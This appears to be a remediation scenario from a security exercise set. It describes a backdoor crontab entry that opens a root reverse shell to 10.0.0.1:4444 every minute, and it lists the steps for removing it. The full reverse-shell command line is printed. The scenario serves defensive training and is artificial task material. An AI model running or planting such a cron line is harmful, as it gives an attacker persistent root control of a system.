# Scenario 48: Crontab with Reverse Shell Backdoor

## Vulnerability
A malicious crontab entry has been planted that executes a reverse shell every minute:
```
* * * * * root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

This entry exists in both `/etc/crontab` (system crontab) and `/var/spool/cron/crontabs/root` (root's user crontab). The reverse shell attempts to connect to `10.0.0.1:4444` every minute, providing an attacker with persistent interactive root shell access.

## CWE Classification
- **CWE-506**: Embedded Malicious Code

## Impact
- **Persistent Backdoor**: The reverse shell re-establishes every minute, providing persistent access even after the attacker disconnects.
- **Root-Level Access**: The cron job runs as root, giving the attacker full system control.
- **Data Exfiltration**: An attacker with root shell access can steal any data on the system.
- **Stealth**: Crontab backdoors are often overlooked during manual security reviews.

## What Needs to Be Fixed
1. Remove the malicious reverse shell crontab entries from `/etc/crontab`.
2. Remove the malicious entries from `/var/spool/cron/crontabs/root`.
3. Audit all crontab files (`/etc/cron.d/`, `/etc/cron.daily/`, etc.) for suspicious entries.
4. Preserve legitimate cron jobs (e.g., the apt-get update job).
5. Ensure the cron service still functions correctly for legitimate scheduled tasks.

## Affected Files
- `/etc/crontab` -- system-wide crontab with malicious entry
- `/var/spool/cron/crontabs/root` -- root's user crontab with malicious entry

## Source Reference
- TAMU `audit_cron.sh` -- audits crontab entries for suspicious commands
- TAMU `harden_cron.sh` -- hardens cron configuration
